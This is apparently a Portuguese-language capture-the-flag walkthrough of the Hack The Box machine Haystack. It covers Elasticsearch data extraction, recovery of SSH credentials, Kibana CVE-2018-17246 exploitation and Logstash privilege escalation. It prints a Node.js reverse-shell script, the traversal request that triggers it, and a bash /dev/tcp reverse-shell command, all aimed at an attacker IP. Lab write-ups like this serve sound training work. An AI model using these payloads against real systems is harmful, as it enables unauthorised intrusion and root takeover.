---
title: "Hack The Box - Haystack"
tags: [Linux,Easy,Web,SSH Konami,Port Forwading,Linpeas]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/195>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas

> Porta 22 -> SSH

> Porta 80 -> Servidor Web

> Porta 9200 -> Outro servidor Web

## Enumeração das portas 80 e 9200

Abrindo a página verificamos o que tem nela (Porta 80)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_web.png)

Abrindo a página verificamos o que tem nela (Porta 9200)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_web1.png)

### Enumeração Elastichsearch

Verificamos na porta 9200 há um serviço chamado elastichsearch, então vamos procurar nos informar um pouco mais do que se trata esse serviço

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el.png)

> https://www.elastic.co/guide/en/elasticsearch/reference/6.4/index.html

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el1.png)

> https://www.elastic.co/guide/en/elasticsearch/reference/6.4/cat.html

Encontramos esse post do blog que explica mais ou menos como testar a API do elasticsearch

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el2.png)

Por exemplo, para ver se funciona testamos isso:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el4.png)

Vamos iniciar agora enumerando todas as databases

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el5.png)

Dentro da database `indices` verificamos todas as tables dele e tem duas que nos chamam atenção

> quotes e bank

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el6.png)

Damos mais uma pesquisada pra verificar como podemos extrair dados dessa database

Encontramos aqui

> https://www.elastic.co/guide/en/elasticsearch/reference/6.4/docs-get.html

Ele explica mais ou menos como devemos fazer a pesquisa dentro da aplicação, meio intuitivo o _search

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el7.png)

# Exploração Elasticsearch

## Enumeração database QUOTES

Então realizamos a pesquisa dentro dessa table da database

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el8.png)

Po, ficou muito ruim a vizualição, então vamos utilizar o `JQ` pra ficar mais visível

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el9.png)

Realmente, agora ficou muito melhor de ver os dados

Agora vamos começar a filtrar melhor, o único campo que possivelmente me interessa nessa bagaça toda é o campo .hits pq ele tem texto

Filtramos apenas por size 1, quero só uma tag, fica melhor pra trabalhar, depois tiramos ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el10.png)

Bom, como o campo que me interessa é o .hits, então vamos filtrar por ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el11.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el12.png)

Agora filtramos o campo _source, que é o que tem o texto

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el13.png)

Agora novamente filtro dentro do _source só que somente o .quote

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el14.png)

Show! Temos apenas o que interessa, agora podemos retornar para todas as querys, não somente uma como eu estava filtrando

Como sabemos que há 253 documentos (lá em cima quando eu fiz o filtro pra apenas 1 aparece o campo Total: 253) podemos fazer para todos, no caso eu vou fazer com o campo 5 só para exemplificar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_el15.png)

Agora vamos enumerar a database bank

## Enumerando dabatase BANK

Procedemos do mesmo modo com essa database, vamos fazer passo a passo aqui também pra massificar melhor o procedimento, depois retornamos para a quotes

Aqui já filtramos por 1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_bank.png)

Aqui filtramos o .hits .hits[0]

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H-bank1.png)

Agora dentro do campo _source vamos pegar apenas o email

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_bank2.png)

Agora pegamos 12 e-mails por exemplo, poderia ser mais

Lembrar de tirar o 0 do .hits[0], pq senão ele vai pegar somente a 1º requisição, somente o 1º e-mail

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_bank3.png)

## Enumerando mais a fundo a database QUOTES

Bom, já explicamos a ideia de como funciona a exploração dessa API do Elasticsearch, agora vamos fazer mais a fundo a database do quotes pra podermos prosseguir na exploração dessa máquina

Não sei se você se lembra mas o que vinha ali estava em espanhol
Pô, eu sei falar espanhol, ficaria simples de verificar, mas vamos fazer de conta que está em um idioma que você não entende porra nenhuma, sei lá, um russou o chinês da vida.

### Script para traduzir

Vamos desenvolver um script em python pra fazer essa tradução pra gente

Primeiro passo é criar um script que pegue os dados do site, só o que interessa que é o texto em si

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python0.png)

Procuramos por um módulo de python pra realizar a tradução

> https://pypi.org/project/googletrans/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_pip.png)

Instalamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_pip1.png)

Script pronto

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python.png)

Executamos (Aqui eu mudei o 253 para 1 pra somente mostrar uma)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python1.png)

Agora executamos nas 253 e jogamos a saida para o arquivo *quotes-traduzidas.txt*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python3.png)

Agora começamos a pesquisar por palavras chave pra ver se encontramos algo útil

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python4.png)

Opa! Encontramos o que estavamos procurando

Parece ser um base64, então decodificamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_python5.png)

> pass: spanish.is.key

> user: security

### Segundo modo de se explorar essa aplicação

Aqui iremos explorar de outro modo para obter essa mesma chave SSH

Achei bem aleatório esse modo, bem CTF, mas é interessante demonstrar também

Pegamos a imagem da página web e salvamos ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_string.png)

Rodamos o comando `strings` na foto e na última linha recebemos o que parece ser um base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_string1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_string2.png)

Decodificamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_string3.png)

> la aguja en el pajar es "clave"

Traduzimos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_google.png)

Hum... a agulha no palheiro é a chave (clave)

Bom, agora devemos procurar a agulha no palheiro que se chama clave, o palheiro seria a database do elasticsearch

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_clave.png)

Voilá. Encontramos a mesma coisa, a partir daqui já da pra proseguirmos.

# Exploração

## Login SSH

Logamos via ssh com esse login e senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_ssh.png)

# Escalação de Privilégio

Agora vamos iniciar a escalação de privilégio dessa máquina

## Linpeas

Vou rodar o linpeas por que eu gosto dele, acho maneiro as cores

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_linpeas.png)

Rodamos ele na Haystack

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_lin1.png)

Verificamos que está sendo executado o logstach como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_logstach.png)

```
O Logstash é o motor central de fluxo de dados do Elastic Stack para coletar, enriquecer e unificar todos os seus dados independentemente do formato ou esquema. O processamento em tempo real é especialmente eficiente quando associado ao Elasticsearch, ao Kibana e ao Beats.
```
### Logstach

Bom, vamos até a pasta dele, pra verificar se conseguimos modificar algo ai

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_logstach1.png)

Puts, só quem consegue mexer nesses arquivos é o usuário kibana, então temos que escalar pro kibana

### Kibana

Verificando no linpeas, a porta 5601 local está aberta, e é a porta que o Kibana roda

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_kib.png)

```
O Kibana é uma aplicação open source de front-end que trabalha com o Elastic Stack, fornecendo recursos de busca e visualização de dados indexados no Elasticsearch. Comumente conhecido como a ferramenta de gráficos para o Elastic Stack (que anteriormente chamava-se ELK Stack após o Elasticsearch, o Logstash e o Kibana), o Kibana também atua como interface do usuário para monitorar, gerenciar e proteger um cluster do Elastic Stack, além de ser o hub centralizado para soluções integradas desenvolvidas no Elastic Stack. Desenvolvido em 2013 a partir da comunidade do Elasticsearch, o Kibana cresceu e se tornou a janela de acesso ao próprio Elastic Stack, oferecendo um portal para usuários e empresas.
```

Verificamos se realmente é o Kibana nessa porta

Shoow! É o Kibana sim

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_kib1.png)

#### Verificando a versão do Kibana

Agora vamos verificar qual a versão do Kibana está rodando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_kib2.png)

Verificamos que é a versão 6.4.2

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_kib3.png)

#### Port Forwading

Bom, agora que sabemos que o serviço está disponível apenas localmente, temos que fazer um Port Forwading para nossa Kali, pra poder acessar essa aplicação a partir dela

O lado bom é que temos uma conexão SSH, o que facilita e muito o Port Forwading

Para realizar ele, irei utilizar o `SSH Konami`

> https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_k.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_k1.png)

Primeiro passo é digital ~C no terminal SSH (Esse deve ser o primeiro comando)

Após isso irá abrir o prompt para Port Forwading, então digitamos -L 5602:127.0.0.1:5601

O que quer dizer?

> -L -> Local Forwding (uma porta no Haystack será espelhada em uma porta na minha Kali)

> 5602:127.0.0.1 -> Vai abrir localmente (Kali) essa porta 5602

> 5601 -> A porta que será espelhada do servidor Haystack

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_p.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_p1.png)

Pronto, Port Fowarding realizado, agora eu tenho na minha Kali porta 5602 o serviço que está sendo disponibilizado apenas localmente na porta 5601 do Haystack

Acessamos via browser

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_p2.png)

Vamos em `Management` e verificamos novamente a versão dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_p3.png)

Comprovamos que a versão é 6.4.2

#### Procurando Exploits para Kibana

Encontramos esse:

> https://github.com/mpgn/CVE-2018-17246

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_exp1.png)

Lendo o que ele faz, verificamos essa PoC

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_exp2.png)

Devemos executar esse script dentro da máquina através do Kibana, então salvamos em algum lugar dentro da máquina Haystack esse script, atentando para mudar nosso IP, no caso eu coloquei dentro da pasta /dev/shm

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.16.119", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_shelljs.png)

Procuramos como executar ele agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_exec.png)

##### Explorando o Kibana

Agora vamos executar e ver se ganhamos o shell de Kibana

> curl 'localhost:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/shell.js'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_shell.png)

Dentro da pasta logstash verificamos arquivos que somente o grupo Kibana pode executar, e nós com o usuário Kibana agora podemos executar

Verificamos três arquivos de configuração, temos que ver como podemos explorar eles agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_priv.png)

Verificando o que eles fazem temos:
Primeira coisa é o input.
Um arquivo, especificamos qual vai ser executado, como root, depois vamos para o filter.conf

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_priv1.png)

Aqui ele vai verificar se o type está como execute, se der match no comando no arquivo (match), vai executar e vai pra output

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_priv2.png)

Aqui está dizendo somente que ele executa, e como o processo está como root, ele vai ser executado como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_priv3.png)

##### Escalando

Então vamos criar um arquivo na pasta especificada /opt/kibana/logstash_* e colocar o comando que quero que execute (tem que dar match com a regex que ta no filter)

> Ejecutar comando : bash -i >& /dev/tcp/10.10.16.119/443 0>&1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_priv4.png)

Esperamos um minuto e ganhamos a shell de Root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_priv5.png)

#### Pegamos a flag de root e user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haystack/H_user.png)